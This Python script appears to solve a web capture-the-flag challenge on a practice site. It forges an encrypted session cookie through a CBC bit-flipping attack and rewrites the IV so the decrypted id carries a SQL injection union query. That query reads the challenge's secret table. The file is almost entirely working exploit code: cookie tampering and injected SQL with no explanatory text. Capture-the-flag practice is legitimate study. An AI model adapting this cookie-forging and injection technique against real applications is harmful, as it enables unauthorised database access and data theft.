# -*- coding:utf8 -*-

import re
import urllib
from base64 import *

import requests


def mydecode(value):
    return b64decode(urllib.parse.unquote(value))


def myencode(value):
    return urllib.parse.quote(b64encode(value))

def mycbc(value,idx,c1,c2):
    lst=bytearray(value)
    lst[idx]=(lst[idx]^ord(c1)^ord(c2))
    return lst

def pcat(payload,idx,c1,c2):
    url=r'http://ctf5.shiyanbar.com/web/jiandan/index.php'
    myd={'id':payload}
    res=requests.post(url,data=myd)
    iv=res.cookies['iv']
    cipher=res.cookies['cipher']

    iv_raw=mydecode(iv)
    cipher_raw=mydecode(cipher)

    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))
    cookies_new={'iv':iv,'cipher':cipher_new}
    text=requests.get(url,cookies=cookies_new).text
    plain=b64decode(re.findall(r"base64_decode\('(.*?)'\)",text)[0])

    first='a:1:{s:2:"id";s:' # a:1:{s:2:"id";s:8:"12345678";}
    iv_new=bytearray(iv_raw)
    for i in range(16):
        iv_new[i]=ord(first[i])^plain[i]^iv_raw[i]
    iv_new=myencode(iv_new)

    cookies_new={'iv':iv_new,'cipher':cipher_new}
    text=requests.get(url,cookies=cookies_new).text
    print ('Payload:%s\n>> ' %(payload))
    print (text)
    pass


def get_flag():
    # pcat('12',4,'2','#')
    # pcat('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u')
    pcat("0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);" + chr(0), 6, '2', 'u')
    pass

if __name__ == '__main__':
    get_flag()